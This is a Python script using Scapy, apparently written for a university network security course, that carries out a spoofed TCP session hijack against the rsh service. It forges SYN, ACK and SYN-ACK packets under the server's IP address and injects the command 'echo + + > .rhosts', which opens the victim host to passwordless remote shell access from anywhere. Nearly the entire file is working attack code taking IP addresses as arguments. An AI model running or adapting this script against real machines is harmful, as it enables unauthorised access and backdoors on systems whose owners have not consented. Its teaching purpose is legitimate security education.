#!/usr/bin/python3

# 05/03/2021

# Authors
# =======
# Mohammed Jamal and Alakbar Zeynalzade

# Purpose
# =======
# This code was completed for the Advanced Network Security (F20AN) course at
# Heriot-Watt University to demonstrate TCP session hijacking

# U · URG bit
# A · ACK bit
# P · PSH bit
# R · RST bit
# S · SYN bit
# F · FIN bit

from scapy.all import *
import time
from random import randint
import sys

x_ip = sys.argv[1]      # Victim's IP address
srv_ip = sys.argv[2]    # Server's IP address		
x_port = 514			# Victim's port number 	
srv_port = 1023		 	# Server's port number

sequence = 778933536 	# 32 bit sequence number in TCP header

# Payload: "port\x00client_username\x00server_username\x00command\x00"
data = "1022\x00seed\x00seed\x00echo + + > .rhosts\x00"

# send_SYN sends a synchronise packet to initiate TCP handshake


def send_SYN(sip, dip, sport, dport, seq):
    ip = IP(src=sip, dst=dip)
    tcp = TCP(sport=sport, dport=dport, flags="S", seq=seq)
    packet = ip/tcp

    print("Sending SYN to {}:{} from {}:{} with sequence number {}".format(
        sip, sport, dip, dport, sequence))
    send(packet)

# send_ACK


def send_ACK(sip, dip, sport, dport, seq, ack):
    ip = IP(src=sip, dst=dip)
    tcp = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack)
    packet = ip/tcp

    print("Sending ACK to {}:{} from {}:{} with sequence number {} and acknowledgement {}".format(
        sip, sport, dip, dport, seq, ack))
    send(packet)


def send_RSH_data(sip, dip, sport, dport, seq, ack, data):
    ip = IP(src=sip, dst=dip)
    tcp = TCP(sport=sport, dport=dport, flags="AP", seq=seq, ack=ack)
    packet = ip/tcp/data

    print("Sending ACK, PSH to {}:{} from {}:{} with sequence number {} and acknowledgement {} and data:".format(
        sip, sport, dip, dport, seq, ack))
    print(data)
    send(packet)


def send_SYNACK(sip, dip, sport, dport, seq, ack):
    ip = IP(src=sip, dst=dip)
    tcp = TCP(sport=sport, dport=dport, flags="SA", seq=seq, ack=ack)
    packet = ip/tcp

    print("Sending SYN,ACK to {}:{} from {}:{} with sequence number {} and acknowledgement {}".format(
        sip, sport, dip, dport, seq, ack))
    send(packet)


sniffer = AsyncSniffer(count=5, filter="tcp")
sniffer.start()
send_SYN(srv_ip, x_ip, srv_port, x_port, sequence)

print("Waiting 1 second...")
time.sleep(1)
sniffer.stop()

results = sniffer.results
print(results)

SEQv = results[-1][TCP].seq
ACK = SEQv + 1
SEQ = results[-1][TCP].ack

print("Waiting 1 second...")
time.sleep(1)

# sniff syn+ack response from victim
send_ACK(srv_ip, x_ip, srv_port, x_port, SEQ, ACK)

print("Waiting 1 second...")
time.sleep(1)

sniffer.start()

send_RSH_data(srv_ip, x_ip, srv_port, x_port, SEQ, ACK, data)

print("Waiting 1 second...")
time.sleep(1)

sniffer.stop()

results = sniffer.results
print(results)

synSEQ = results[-1][TCP].seq
print("Sniffed SYN sequence number: " + str(synSEQ))

print("Waiting 1 second...")
time.sleep(1)

send_SYNACK(srv_ip, x_ip, 1022, 1023, 294967295, synSEQ+1)
